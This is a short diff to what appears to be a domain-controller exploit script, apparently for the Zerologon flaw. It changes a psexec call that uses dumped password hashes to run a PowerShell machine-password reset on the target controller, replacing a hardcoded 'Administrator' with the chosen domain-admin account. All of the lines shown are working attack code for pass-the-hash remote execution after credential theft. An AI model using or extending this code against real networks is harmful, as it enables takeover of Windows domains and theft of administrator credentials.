@@ -110,7 +110,7 @@ def perform_attack(dc_handle, dc_ip, target_computer, target_da="Administrator")
 #    print(f)
     hashes = ':'.join(f.split(':')[2:-3])
     print(hashes)
-    psexec = psexec.PSEXEC('powershell.exe -c Reset-ComputerMachinePassword', None, None, None, hashes=hashes, username="Administrator", serviceName='fucked')
+    psexec = psexec.PSEXEC('powershell.exe -c Reset-ComputerMachinePassword', None, None, None, hashes=hashes, username=target_da, serviceName='fucked')
     psexec.run(dc_name, dc_ip)
   else:
     print('\nAttack failed. Target is probably patched.')
